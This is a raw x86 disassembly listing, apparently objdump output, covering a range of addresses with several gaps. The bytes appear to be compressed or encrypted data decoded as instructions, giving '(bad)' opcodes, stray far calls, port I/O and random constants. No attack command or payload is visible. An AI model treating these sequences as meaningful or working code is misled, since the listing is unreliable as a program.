  428abb:	(bad)  
  428abc:	cli    
  428abd:	cld    
  428abe:	pop    edx
  428abf:	mov    ah,BYTE PTR [edx+0xfdca3a6]
  428ac5:	vpperm ymm1,ymm2,ymm0,YMMWORD PTR [ebp-0x49]
  428acc:	adc    al,0x27
  428ace:	or     al,0xb4
  428ad0:	dec    esi
  428ad1:	aas    
  428ad2:	lods   eax,DWORD PTR ds:[esi]
  428ad3:	push   edx
  428ad4:	mov    WORD PTR [eax],fs
  428ad6:	push   ecx
  428ad7:	pop    ds
  428ad8:	cdq    
  428ad9:	pushf  
  428ada:	call   0x3352:0x8da143ef
  428ae1:	pop    eax
  428ae2:	lods   eax,DWORD PTR ds:[esi]
  428ae3:	retf   
  428ae4:	sbb    bh,bl
  428ae6:	repz lds ecx,FWORD PTR [ebp-0x5d]
  428aea:	and    BYTE PTR [eax+0x1a],ch
  428aed:	stos   DWORD PTR es:[edi],eax
  428aee:	sub    eax,DWORD PTR [edi]
  428af0:	push   cs
  428af1:	sbb    bl,al
  428af3:	retf   
  428af4:	pop    ebx
  428af5:	in     al,0xa1
  428af7:	sahf   
  428af8:	push   ss
  428af9:	(bad)  
  428afa:	std    
  428afb:	mov    cl,0x38
  428afd:	dec    ecx
  428afe:	mov    BYTE PTR [ecx+edi*2],ah
  428b01:	mov    esi,0xb65695a5
  428b06:	cli    
  428b07:	adc    bh,al
  428b09:	cwde   
  428b0a:	add    al,0xa2
  428b0c:	push   DWORD PTR [edx]
  428b0e:	push   ds
  428b0f:	pop    ds
  428b10:	lahf   
  428b11:	xor    eax,0x111c0e41
  428b16:	aaa    
  428b17:	push   edi
  428b18:	popf   
  428b19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428b1a:	ins    BYTE PTR es:[edi],dx
  428b1b:	xchg   ebp,eax
  428b1c:	cwde   
  428b1d:	jle    0x428b98
  428b1f:	cwde   
  428b20:	cmp    BYTE PTR [edi+0x2b4165b7],bh
  428b26:	push   ecx
  428b28:	mov    edx,0xb0f0a42f
  428b2d:	repnz or al,0x76
  428b30:	stos   DWORD PTR es:[edi],eax
  428b31:	test   eax,0x8b0c776f
  428b36:	sbb    DWORD PTR [esi+0x55],edx
  428b39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428b3a:	push   eax
  428b3b:	call   0xf14e:0x3c93fad3
  428b42:	in     eax,dx
  428b43:	jp     0x428bbb
  428b45:	test   DWORD PTR [esi-0x29],0x2e0dd54d
  428b4c:	jbe    0x428b67
  428b4e:	mov    eax,0x1a1d7513
  428b53:	fld1   
  428b55:	and    al,0x4c
  428b57:	and    ebp,DWORD PTR [ebx-0x69]
  428b5a:	ds shl ecx,1
  428b5d:	push   0x24a29909
  428b62:	fs stos DWORD PTR es:[edi],eax
  428b64:	test   eax,0xd202c22c
  428b69:	push   esi
  428b6a:	scas   eax,DWORD PTR es:[edi]
  428b6b:	das    
  428b6c:	out    dx,al
  428b6d:	imul   ch
  428b6f:	fwait
  428b70:	repnz sub BYTE PTR [esi],al
  428b73:	arpl   WORD PTR [edx],si
  428b75:	sbb    eax,DWORD PTR [eax+0x586e8153]
  428b7b:	fst    st(2)
  428b7d:	ss cli 
  428b7f:	mov    eax,ds:0xcd820431
  428b84:	inc    ebx
  428b85:	inc    ebp
  428b86:	xchg   ebp,eax
  428b87:	sahf   
  428b88:	cmp    eax,0x3dadba41
  428b8d:	daa    
  428b8e:	jge    0x428b65
	...
  428bf4:	lds    edx,FWORD PTR [ebp-0x76]
  428bf7:	cli    
  428bf8:	call   0xbbc:0x947ff5ff
  428bff:	push   0xa3b8807c
  428c04:	push   esp
  428c05:	mov    bl,0x1
  428c07:	add    BYTE PTR [ecx+eax*1],al
  428c0a:	add    BYTE PTR [eax],al
  428c0c:	test   edx,ebx
  428c0e:	pop    edi
  428c0f:	mov    esp,0x459417d8
  428c14:	inc    ebp
  428c15:	mov    dl,0x4c
  428c17:	rcr    BYTE PTR [ebx+edi*2],0x45
  428c1b:	jno    0x428c19
  428c1d:	fidiv  DWORD PTR [edx+edx*8]
  428c20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428c21:	gs loope 0x428bcb
  428c24:	std    
  428c25:	and    DWORD PTR [esp+eax*2-0x6a],0xffffffa9
  428c2a:	sub    eax,0xbfb68b19
  428c2f:	dec    ecx
  428c30:	jmp    0xaf14:0xff371d95
  428c37:	push   0x34844585
  428c3c:	jns    0x428c4a
  428c3e:	bsf    esi,ecx
  428c41:	adc    DWORD PTR [edi+0xc],eax
  428c44:	and    eax,0x452cc2cf
  428c49:	(bad)  
  428c4a:	into   
  428c4b:	ror    DWORD PTR [edx],1
  428c4d:	test   al,0x73
  428c4f:	mov    esi,0xc6a3eb6d
  428c54:	sub    BYTE PTR [edi+0x1cdefef9],bh
  428c5a:	lods   al,BYTE PTR ds:[esi]
  428c5b:	fcomp  DWORD PTR [esi+0x1117f4a4]
  428c61:	or     cl,bh
  428c63:	cmc    
  428c64:	and    ecx,DWORD PTR [edx-0x2f]
  428c67:	test   DWORD PTR [esi+0x7473bab6],esp
  428c6d:	arpl   ax,bp
  428c6f:	or     BYTE PTR [ecx+0x3edef44f],ah
  428c75:	push   es
  428c76:	push   ebp
  428c77:	xlat   BYTE PTR ds:[ebx]
  428c78:	xor    al,BYTE PTR [esi-0x47]
  428c7b:	fist   WORD PTR [edi]
  428c7d:	jo     0x428c24
  428c7f:	fidivr DWORD PTR [ecx]
  428c81:	outs   dx,DWORD PTR ds:[esi]
  428c82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428c83:	aad    0x7c
  428c85:	xor    al,0x64
  428c87:	pop    ebp
  428c88:	fcmovnbe st,st(0)
  428c8a:	and    BYTE PTR [ebx],ch
  428c8c:	xchg   ebx,eax
  428c8d:	mov    esi,0x28786973
  428c92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428c93:	xchg   ebp,eax
  428c94:	cmp    DWORD PTR [ebx+0x33ccac28],0xd080ead6
  428c9e:	fild   QWORD PTR [edx+0x39f74b4f]
  428ca4:	es inc edi
  428ca6:	std    
  428ca7:	fld    QWORD PTR [edi+0x6b]
  428caa:	bound  ebp,QWORD PTR [ebx]
  428cac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428cad:	(bad)
  428cb0:	mov    edi,0xffd88a1c
  428cb5:	xlat   BYTE PTR ds:[ebx]
  428cb6:	cs out 0x96,eax
  428cb9:	fcom   QWORD PTR [eax+0x57]
  428cbc:	popf   
  428cbd:	inc    edx
  428cbe:	outs   dx,BYTE PTR ds:[esi]
  428cbf:	cmp    eax,DWORD PTR [ecx+0x7]
  428cc2:	xchg   DWORD PTR [edi+0x6e278d1e],ebp
  428cc8:	jb     0x428cf2
  428cca:	and    eax,0x93c222c
  428ccf:	push   ebx
  428cd0:	mov    esp,0x835ba6cb
  428cd5:	xchg   esp,eax
  428cd6:	mov    WORD PTR [edx+esi*2-0x48251700],fs
  428cdd:	cmp    esp,DWORD PTR [ecx-0x666ac9b0]
  428ce3:	shl    DWORD PTR [ebx+eiz*8],0x59
  428ce7:	rcl    BYTE PTR [edi+0x43],0x49
  428ceb:	cwde   
  428cec:	test   BYTE PTR [edx-0x51834b23],cl
  428cf2:	jmp    0x428ce7
  428cf4:	sub    bl,cl
  428cf6:	loop   0x428d55
  428cf8:	push   edi
  428cf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428cfa:	lods   al,BYTE PTR ds:[esi]
  428cfb:	xor    eax,0x66b6ce1a
  428d00:	fstp   st(1)
  428d02:	int3   
  428d03:	ins    BYTE PTR es:[edi],dx
  428d04:	les    esp,FWORD PTR [ecx]
  428d06:	inc    esi
  428d07:	xchg   DWORD PTR [eax-0x7d4450aa],edx
  428d0d:	(bad)
	...
  428d71:	add    BYTE PTR [eax],al
  428d73:	add    BYTE PTR [ecx-0xace0e4b],al
  428d79:	jne    0x428d3c
  428d7b:	mov    ch,0x90
  428d7d:	int3   
  428d7e:	ins    BYTE PTR es:[edi],dx
  428d7f:	retf   0xa8c1
  428d82:	xchg   ebp,eax
  428d83:	loop   0x428ddd
  428d85:	mov    ah,0x1
  428d87:	add    BYTE PTR [ecx+eax*1],al
  428d8a:	add    BYTE PTR [eax],al
  428d8c:	mov    WORD PTR [ecx],fs
  428d8e:	imul   edi,DWORD PTR [edx+0x4990baac],0xa051a87c
  428d98:	sahf   
  428d99:	test   eax,0x76cf4d7c
  428d9e:	daa    
  428d9f:	and    DWORD PTR [edx],ebp
  428da1:	das    
  428da2:	xor    BYTE PTR [ebp+0x3db97583],0xb5
  428da9:	scas   al,BYTE PTR es:[edi]
  428daa:	add    dl,bl
  428dac:	lea    esp,[ebp+0x49]
  428daf:	ror    al,cl
  428db1:	in     eax,0x23
  428db3:	add    ecx,esp
  428db5:	add    eax,0x508c77b2
  428dba:	inc    ebp
  428dbb:	xlat   BYTE PTR ds:[ebx]
  428dbc:	test   eax,0xc93350ba
  428dc1:	push   esp
  428dc2:	or     eax,0xb0f85117
  428dc7:	stos   DWORD PTR es:[edi],eax
  428dc8:	pop    ecx
  428dc9:	ret    0x9c47
  428dcc:	lds    ecx,FWORD PTR [ebx]
  428dce:	out    0x2e,eax
  428dd0:	or     bl,cl
  428dd2:	pop    eax
  428dd3:	mov    DWORD PTR [eax+0x37],0x4fe28af7
  428dda:	sbb    ebx,DWORD PTR [ecx]
  428ddc:	imul   BYTE PTR [esi-0x25]
  428ddf:	push   0x24
  428de1:	aas    
  428de2:	mov    ds:0xf60daa90,eax
  428de7:	dec    ebx
  428de8:	int3   
  428de9:	pop    ds
  428dea:	push   ebx
  428deb:	shl    DWORD PTR [edi],cl
  428ded:	sti    
  428dee:	fs popf 
  428df0:	cmc    
  428df1:	test   al,0x34
  428df3:	jmp    0x758a57e4
  428df8:	in     al,0xb6
  428dfa:	data16 js 0x428dd7
  428dfd:	cmp    eax,0xf847bcd6
  428e02:	cmp    BYTE PTR [edx+0x79],bl
  428e05:	cdq    
  428e06:	jmp    0x8d52:0xb3d9c9f
  428e0d:	pop    es
  428e0e:	xchg   ebx,eax
  428e0f:	cwde   
  428e10:	lahf   
  428e11:	stos   DWORD PTR es:[edi],eax
  428e12:	(bad)  
  428e13:	dec    ebp
  428e14:	icebp  
  428e15:	pop    es
  428e16:	mov    ds:0x8986a248,al
  428e1b:	inc    esp
  428e1c:	aad    0x9d
  428e1e:	pop    ebp
  428e1f:	scas   eax,DWORD PTR es:[edi]
  428e20:	xchg   esi,eax
  428e21:	or     dl,dh
  428e23:	pop    es
  428e24:	mov    DWORD PTR [eax+0x799c840a],ebx
  428e2a:	cld    
  428e2b:	pusha  
  428e2c:	rcr    bl,cl
  428e2e:	sti    
  428e2f:	push   ds
  428e30:	sbb    dh,BYTE PTR [eax+0x6f]
  428e33:	pop    ebp
  428e34:	stc    
  428e35:	xor    BYTE PTR [edx+0x4eef78d2],cl
  428e3b:	aad    0x5f
  428e3d:	jl     0x428df0
  428e3f:	outs   dx,BYTE PTR ds:[esi]
  428e40:	inc    edi
  428e41:	ins    BYTE PTR es:[edi],dx
  428e42:	(bad)  
  428e44:	cmp    BYTE PTR [esi+0x1e6ee72b],ch
  428e4a:	hlt    
  428e4b:	and    DWORD PTR [edi+0x38b50731],ecx
  428e51:	or     al,0x58
  428e53:	jae    0x428e21
  428e55:	sahf   
  428e56:	mov    al,0x50
  428e58:	mov    bl,0x1
  428e5a:	xor    BYTE PTR [eax],bh
  428e5c:	jae    0x9e87e579
  428e62:	imul   eax,esp,0xb81f30fb
  428e68:	jmp    0x195d2633
  428e6d:	jne    0x428e74
  428e6f:	jle    0x428eb4
  428e71:	pusha  
  428e72:	aaa    
  428e73:	xchg   BYTE PTR [edx+eiz*2],ch
  428e76:	ror    BYTE PTR [edi],cl
  428e78:	mov    esp,0xb794be66
  428e7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428e7e:	in     al,0x23
  428e80:	pop    esi
  428e81:	pop    es
  428e82:	stc    
  428e83:	sbb    al,0x57
  428e85:	(bad)  
  428e86:	mov    edi,0x6ed56b4a
  428e8b:	bound  edi,QWORD PTR [ebx+0xd040c3]
	...
  428ef1:	add    BYTE PTR [eax],al
  428ef3:	add    BYTE PTR [edi+0x5d],cl
  428ef6:	pop    ecx
  428ef7:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428efb:	fstp   st(1)
  428efd:	ror    DWORD PTR [esp+edx*4],0x15
  428f01:	pop    ebp
  428f02:	cdq    
  428f03:	test   eax,0x1b55c
  428f08:	add    al,0x1
  428f0a:	add    BYTE PTR [eax],al
  428f0c:	repnz dec esi
  428f0e:	xchg   ebp,eax
  428f0f:	jne    0x428f38
  428f11:	(bad)  
  428f12:	fwait
  428f13:	or     eax,0x5a400c65
  428f18:	imul   ebp,DWORD PTR [edi-0x2d67dbe7],0x36336fad
  428f22:	inc    ebp
  428f23:	add    eax,0xbf586b86
  428f28:	or     esp,DWORD PTR [ebp-0x6a707aa8]
  428f2e:	sub    al,0x8e
  428f30:	or     eax,0x130fd8ed
  428f35:	sub    esi,DWORD PTR [esi-0x10]
  428f38:	pop    ebx
  428f39:	icebp  
  428f3a:	ins    DWORD PTR es:[edi],dx
  428f3b:	xor    eax,DWORD PTR [ebp+0x73]
  428f3e:	mov    bh,0x78
  428f40:	clc    
  428f41:	xor    al,0xe5
  428f43:	adc    eax,0x61df0bc3
  428f48:	cmp    DWORD PTR [ecx+edx*2+0x52],0x5628623d
  428f50:	cmp    eax,0xeeb52aa7
  428f55:	gs loope 0x428ed8
  428f58:	dec    dl
  428f5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428f5b:	neg    ebp
  428f5d:	jo     0x428f0c
  428f5f:	pop    esi
  428f60:	mov    dh,0x43
  428f62:	mov    DWORD PTR [esi+edx*8-0x53776e18],0x2a404109
  428f6d:	retf   
  428f6e:	ss scas al,BYTE PTR es:[edi]
  428f70:	scas   al,BYTE PTR es:[edi]
  428f71:	push   ecx
  428f72:	adc    al,0xd3
  428f74:	mov    edx,DWORD PTR [ecx-0x41]
  428f77:	sub    dh,ah
  428f79:	loope  0x428f04
  428f7b:	imul   BYTE PTR [esi]
  428f7d:	lods   eax,DWORD PTR ds:[esi]
  428f7e:	push   ds
  428f7f:	cmp    eax,ebp
  428f81:	imul   DWORD PTR [esi-0x41]
  428f84:	mov    dl,0x6f
  428f86:	mov    ch,BYTE PTR [edx+0x13768a05]
  428f8c:	icebp  
  428f8d:	pop    esi
  428f8e:	test   DWORD PTR [ecx+0x6d],0xe5936833
  428f95:	adc    ebx,esi
  428f97:	fistp  QWORD PTR [edi+0x4f]
  428f9a:	mov    ds:0x173118e1,al
  428f9f:	hlt    
  428fa0:	jmp    DWORD PTR [ebx]
  428fa2:	ss inc bx
  428fa5:	and    al,0x85
  428fa7:	lahf   
  428fa8:	dec    esi
  428fa9:	fdiv   st,st(1)
  428fab:	jb     0x429011
  428fad:	push   eax
  428fae:	push   es
  428faf:	fadd   DWORD PTR [eax]
  428fb1:	sub    DWORD PTR [ebp+0x7be4c6ca],esp
  428fb7:	enter  0x50b5,0x55
  428fbb:	pusha  
  428fbc:	fld    QWORD PTR [eax+0x3dba1b30]
  428fc2:	call   0xdfbe:0x6e5fd59d
  428fc9:	adc    BYTE PTR [ecx+0xc84d788],bh
  428fcf:	cwde   
  428fd0:	and    cl,ch
  428fd2:	pop    ecx
  428fd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428fd4:	mov    ss,WORD PTR [edi]
  428fd6:	ret    0xe551
  428fd9:	sbb    BYTE PTR [edi+0x9],bl
  428fdc:	in     eax,dx
  428fdd:	ja     0x428fe9
  428fdf:	mov    eax,0x69b73446
  428fe4:	push   cs
  428fe5:	adc    eax,0x99e0e53d
  428fea:	mov    esp,0x35569fa5
  428fef:	pop    ds
  428ff0:	stos   BYTE PTR es:[edi],al
  428ff1:	nop
  428ff2:	les    ebx,FWORD PTR [eax-0x4c]
  428ff5:	push   ds
  428ff6:	cwde   
  428ff7:	cli    
  428ff8:	xchg   ecx,eax
  428ff9:	jmp    0x429029
  428ffb:	sbb    ecx,esp
  428ffd:	inc    ebp
  428ffe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428fff:	push   0x315acce9
  429004:	sub    eax,0x7ad09c06
  429009:	cmp    esi,DWORD PTR [bp+di-0x3]
  42900d:	push   edi
  42900e:	loop   0x428fbd
	...
  429074:	loope  0x429062
  429076:	mov    ebx,es
  429078:	(bad)  
  429079:	jecxz  0x42906a
  42907b:	out    dx,al
  42907c:	mov    edi,0x9dfc7b77
  429081:	test   DWORD PTR [ecx+0x1b660ce],eax
  429087:	add    BYTE PTR [ecx+eax*1],al
  42908a:	add    BYTE PTR [eax],al
  42908c:	stc    
  42908d:	adc    cl,BYTE PTR [esi-0x2f754356]
  429093:	imul   ebp,DWORD PTR [ecx],0x44
  429096:	les    esi,FWORD PTR [eax-0x5e]
  429099:	fldln2 
  42909b:	fs mov ebp,0xd72c2a22
  4290a1:	pop    ss
  4290a2:	mov    dh,0xe0
  4290a4:	ret    
  4290a5:	ins    BYTE PTR es:[edi],dx
  4290a6:	fs pusha 
  4290a8:	add    al,0x16
  4290aa:	aad    0x87
  4290ac:	sub    BYTE PTR [edi],bl
  4290ae:	mov    BYTE PTR [edx-0x78],cl
  4290b1:	popf   
  4290b2:	nop
  4290b3:	mov    ss,WORD PTR [eax]
  4290b5:	fnstenv [esi+0x12]
  4290b8:	sbb    esi,DWORD PTR [ebp+eiz*4-0x7c41852b]
  4290bf:	adc    BYTE PTR [edi],ah
  4290c1:	jne    0x429117
  4290c3:	cli    
  4290c4:	mov    DWORD PTR [edi],esi
  4290c6:	lahf   
  4290c7:	nop
  4290c8:	fstp   TBYTE PTR [ecx]
  4290ca:	out    0x74,al
  4290cc:	pop    esp
  4290cd:	or     DWORD PTR [edx-0x4055c18c],ebx
  4290d3:	mov    ah,0x60
  4290d5:	jne    0x42906f
  4290d7:	mov    cs,ebp
  4290d9:	inc    edi
  4290da:	sbb    al,0x5
  4290dc:	test   al,0x16
  4290de:	shl    ah,0x8e
  4290e1:	mov    ecx,0x16eef10c
  4290e6:	sahf   
  4290e7:	pop    ecx
  4290e8:	sbb    bh,bh
  4290ea:	adc    al,0x1
  4290ec:	jmp    0x4290ff
  4290ee:	call   0x2a4ed859
  4290f3:	ss jmp 0x429139
  4290f6:	pop    es
  4290f7:	xchg   ebp,eax
  4290f8:	leave  
  4290f9:	jle    0x429114
  4290fb:	test   BYTE PTR ds:0x76a7d8d0,ch
  429101:	lahf   
  429102:	dec    eax
  429103:	mov    ecx,0x769f26f0
  429108:	out    0x47,al
  42910a:	in     eax,0x2e
  42910c:	add    bh,dl
  42910e:	lea    ecx,[esp+edx*1-0x37c6be9]
  429115:	inc    ebp
  429116:	sbb    ch,BYTE PTR [ebp+0x329e5a8d]
  42911c:	or     ecx,DWORD PTR [esp+esi*4]
  42911f:	push   ds
  429120:	cmp    DWORD PTR [esi+ebx*4+0x5b],ebx
  429124:	dec    edx
  429125:	call   0x7de65f30
  42912a:	inc    al
  42912c:	jno    0x429151
  42912e:	dec    eax
  42912f:	aas    
  429130:	dec    ebp
  429131:	and    dl,bl
  429133:	fist   WORD PTR [ebp+0x5a]
  429136:	adc    bl,BYTE PTR [ebx+0x383c151f]
  42913c:	fld    TBYTE PTR [edi]
  42913e:	jge    0x429148
  429140:	repz and eax,0x82d05b46
  429146:	push   0x62c72f7b
  42914b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42914c:	stos   BYTE PTR es:[edi],al
  42914d:	ror    BYTE PTR [ecx-0x5c9e3574],cl
  429153:	and    BYTE PTR ds:0x35f25c1e,al
  429159:	daa    
  42915a:	xchg   esi,eax
  42915b:	jecxz  0x429112
  42915d:	scas   al,BYTE PTR es:[edi]
  42915e:	(bad)  
  42915f:	jb     0x429164
  429161:	mov    ah,0x5e
  429163:	jecxz  0x42917a
  429165:	inc    ebx
  429166:	out    dx,eax
  429167:	enter  0x6955,0xb1
  42916b:	jmp    0x429141
  42916d:	pop    ss
  42916e:	loope  0x4290fa
  429170:	push   esp
  429171:	push   edi
  429172:	dec    edx
  429173:	pop    ebp
  429174:	and    ch,BYTE PTR [edi-0x2e]
  429177:	jg     0x42912a
  429179:	and    al,0x3a
  42917b:	leave  
  42917c:	inc    esi
  42917d:	mov    dh,0xaf
  42917f:	sub    eax,0x1a67f134
  429184:	pop    edi
  429185:	pop    ss
  429186:	ficom  DWORD PTR [ebx-0x1ffdae02]
  42918c:	jl     0x42914f
  42918e:	jge    0x4291a8
	...
  4291f4:	push   esi
  4291f5:	xchg   ebp,edi
  4291f7:	test   ch,bh
  4291f9:	(bad)  
  4291fa:	jg     0x4291d3
  4291fc:	into   
  4291fd:	retf   
  4291fe:	or     DWORD PTR [ecx+ecx*8+0x64ee2ca9],0x40001b7
  429209:	add    DWORD PTR [eax],eax
  42920b:	add    BYTE PTR [esi+0x686ca27d],dl
  429211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429212:	sbb    dl,BYTE PTR [esi-0x43]
  429215:	push   DWORD PTR ds:0x65862d7d
  42921c:	jno    0x4291f4
  42921e:	or     ebx,DWORD PTR [edi+ebp*4+0x3005bd16]
  429225:	xor    BYTE PTR [ecx+0x645c7cda],bh
  42922b:	mov    WORD PTR [edi*2+0x3f95147a],fs
  429232:	jmp    0xce7d:0x33a1c37d
  429239:	test   al,0x26
  42923b:	dec    edi
  42923c:	rcr    DWORD PTR [eax+0x55eb1c06],0xb
  429243:	test   eax,0x3895571a
  429248:	out    0x97,al
  42924a:	add    dh,BYTE PTR [esi+0x39]
  42924d:	inc    esp
  42924e:	fxch   st(7)
  429250:	inc    ebx
  429251:	ds loop 0x429276
  429254:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  429256:	out    0xb1,al
  429258:	ss pop ebp
  42925a:	(bad)
  42925d:	sub    ebx,0x4ff33cfc
  429263:	addr16 jmp 0x501c4704
  429269:	dec    ebp
  42926a:	sbb    BYTE PTR [ecx+0x34],dh
  42926d:	pop    ecx
  42926e:	outs   dx,BYTE PTR ds:[esi]
  42926f:	(bad)  
  429271:	ret    0x60f3
  429274:	dec    edi
  429275:	out    dx,eax
  429276:	lds    edi,FWORD PTR [ebx+0x28]
  429279:	mov    DWORD PTR [eax-0x5a],ecx
  42927c:	xchg   edx,eax
  42927d:	and    ch,BYTE PTR [edx]
  42927f:	iret   
  429280:	pop    eax
  429281:	adc    dh,ch
  429283:	(bad)  
  429285:	xchg   esp,eax
  429286:	clc    
  429287:	pop    esp
  429288:	ret    0xd10d
  42928b:	ret    0x8995
  42928e:	jmp    0x429232
  429290:	int    0xce
  429292:	retf   
  429293:	ficomp DWORD PTR ds:0x536115a4
  429299:	sub    esp,eax
  42929b:	jmp    0x429308
  42929d:	ins    DWORD PTR es:[edi],dx
  42929e:	(bad)  
  42929f:	push   ecx
  4292a0:	scas   eax,DWORD PTR es:[edi]
  4292a1:	call   0x7b5f:0x500d483
  4292a8:	ficom  WORD PTR [ecx]
  4292aa:	mov    eax,0x52d36c77
  4292af:	adc    al,0x19
  4292b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4292b2:	pop    eax
  4292b3:	arpl   WORD PTR [esi-0x5],cx
  4292b6:	mov    cl,0x84
  4292b8:	cmp    DWORD PTR [ebx],eax
  4292ba:	dec    edi
  4292bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4292bc:	retf   
  4292bd:	fidivr WORD PTR [eax+ecx*4]
  4292c0:	das    
  4292c1:	es xor eax,0x9f6bffb6
  4292c7:	dec    esp
  4292c8:	sti    
  4292c9:	fsub   DWORD PTR [edi]
  4292cb:	add    al,0x79
  4292cd:	aas    
  4292ce:	das    
  4292cf:	adc    ebp,DWORD PTR [ebx+0x5abfd638]
  4292d5:	call   0x744c3537
  4292da:	test   dl,dl
  4292dc:	push   0xfffffffa
  4292de:	xchg   ebx,eax
  4292df:	sbb    ax,0x8fab
  4292e3:	je     0x429358
  4292e5:	push   ds
  4292e6:	ret    0x9a53
  4292e9:	push   ebp
  4292ea:	add    cl,BYTE PTR ds:0xa91f7189
  4292f0:	jp     0x429368
  4292f2:	mov    ecx,0x13fced68
  4292f7:	mov    ecx,0x42153959
  4292fc:	push   0x3517ab32
  429301:	sbb    al,0xa8
  429303:	mov    ebx,DWORD PTR [ecx+ebp*2]
  429306:	mov    esp,0xfe0f83f9
  42930b:	mov    esp,0x96599be0
	...
  429374:	lock adc al,0xe1
  429377:	(bad)  
  429378:	in     eax,0xff
  42937a:	call   FWORD PTR [esi]
  42937c:	jae    0x429383
  42937e:	dec    edx
  42937f:	mov    bh,0x80
  429381:	push   ss
  429382:	retf   
  429383:	clc    
  429384:	push   0x40001b8
  429389:	add    DWORD PTR [eax],eax
  42938b:	add    bl,al
  42938d:	mov    al,ds:0xde368623
  429392:	in     al,dx
  429393:	cmp    edi,edi
  429395:	mov    ebp,0x1ad5b4c1
  42939a:	jbe    0x429401
  42939c:	mov    esi,0x3aafe02a
  4293a1:	dec    esi
  4293a2:	xchg   esp,eax
  4293a3:	sub    al,0x58
  4293a5:	pop    esi
  4293a6:	adc    DWORD PTR [eax],edi
  4293a8:	jns    0x429330
  4293aa:	mov    ebp,0x9369ed27
  4293af:	pop    ds
  4293b0:	cmp    dh,BYTE PTR [ebp+0x22]
  4293b3:	clc    
  4293b4:	stc    
  4293b5:	sahf   
  4293b6:	add    esp,esp
  4293b8:	inc    edi
  4293b9:	jae    0x429424
  4293bb:	ins    BYTE PTR es:[edi],dx
  4293bc:	pop    ebx
  4293bd:	mov    DWORD PTR [edx+0x25ed2b51],eax
  4293c3:	aas    
  4293c4:	sbb    cl,BYTE PTR [ecx-0x62b86fae]
  4293ca:	arpl   ax,di
  4293cc:	iret   
  4293cd:	or     esi,DWORD PTR [ebx]
  4293cf:	imul   edx,DWORD PTR [edi+0x54a6782a],0x1f
  4293d6:	xchg   edi,eax
  4293d7:	rcr    DWORD PTR [ecx-0x20],1
  4293da:	push   ebx
  4293db:	xlat   BYTE PTR ds:[ebx]
  4293dc:	xor    al,0xf0
  4293de:	ds mov ah,dh
  4293e1:	shl    BYTE PTR [ebp+ebp*8+0x1e],0xd3
  4293e6:	mov    dh,0x22
  4293e8:	rcl    DWORD PTR [eax-0x4e],0xc5
  4293ec:	cs sub al,0x39
  4293ef:	sbb    DWORD PTR [ebp+eax*8-0x3cda603c],ebp
  4293f6:	nop
  4293f7:	jp     0x42946d
  4293f9:	push   0x3f9875ae
  4293fe:	(bad)  
  4293ff:	in     al,dx
  429400:	in     al,dx
  429401:	in     eax,dx
  429402:	jnp    0x4293cb
  429404:	loopne 0x42943e
  429406:	js     0x429456
  429408:	retf   
  429409:	xchg   esp,eax
  42940a:	dec    ecx
  42940b:	xor    al,BYTE PTR [ecx-0x6e]
  42940e:	daa    
  42940f:	rol    DWORD PTR [edi+0xa],cl
  429412:	cdq    
  429413:	imul   esp,DWORD PTR [ecx-0x58b5f1d2],0xffffffd5
  42941a:	or     bh,dh
  42941c:	jle    0x4293eb
  42941e:	stos   BYTE PTR es:[edi],al
  42941f:	(bad)  [esi-0x3e]
  429422:	out    dx,al
  429423:	outs   dx,BYTE PTR ds:[esi]
  429424:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429425:	inc    esp
  429426:	sub    al,0x7a
  429428:	jb     0x429497
  42942a:	push   esi
  42942b:	lahf   
  42942c:	sti    
  42942d:	and    eax,0x99af375d
  429432:	shl    BYTE PTR [edx+0x67416b11],1
  429438:	mov    dl,0x7f
  42943a:	jmp    0x2b6595ed
  42943f:	out    dx,eax
  429440:	gs dec eax
  429442:	enter  0xf21b,0x86
  429446:	xor    esp,DWORD PTR [ecx+0x49]
  429449:	fbstp  TBYTE PTR [edx-0x2c0eaf15]
  42944f:	xor    BYTE PTR [ecx-0x37],cl
  429452:	push   0x8ae2c606
  429457:	clc    
  429458:	sbb    eax,0x54147c61
  42945d:	mov    bh,0x43
  42945f:	jmp    0x4aa25ebe
  429464:	aam    0x44
  429466:	mov    eax,ds:0x3bf82f05
  42946b:	jg     0x42942c
  42946d:	sti    
  42946e:	add    eax,0x5873eb28
  429473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429474:	push   eax
  429475:	arpl   WORD PTR [ecx*2-0x69348c9c],di
  42947c:	aam    0x7d
  42947e:	inc    ebp
  42947f:	xlat   BYTE PTR ds:[ebx]
  429480:	adc    bl,BYTE PTR [esi+ecx*1-0x143e2c19]
  429487:	xlat   BYTE PTR ds:[ebx]
  429488:	aas    
  429489:	dec    edi
  42948a:	jbe    0x42945f
  42948c:	test   BYTE PTR [ebp+ebp*4+0xe6],ch
	...
  4294f3:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  4294f7:	sub    al,0x53
  4294f9:	ds jg  0x429569
  4294fc:	dec    esp
  4294fd:	arpl   WORD PTR [ebp-0x309d5916],dx
  429503:	(bad)  
  429505:	mov    ecx,0x1040001
  42950a:	add    BYTE PTR [eax],al
  42950c:	and    al,0x6e
  42950e:	or     eax,0x1e7251fd
  429513:	push   ebp
  429514:	add    cl,bl
  429516:	rcl    BYTE PTR [si],0xb7
  42951a:	push   eax
  42951b:	xor    edx,DWORD PTR [edi+edx*8+0x7f5d80c4]
  429522:	mov    dh,0x75
  429524:	dec    edi
  429525:	mov    ds:0xfd87254f,eax
  42952a:	scas   al,BYTE PTR es:[edi]
  42952b:	sub    ebx,ecx
  42952d:	mov    edi,0x2520aa21
  429532:	pop    es
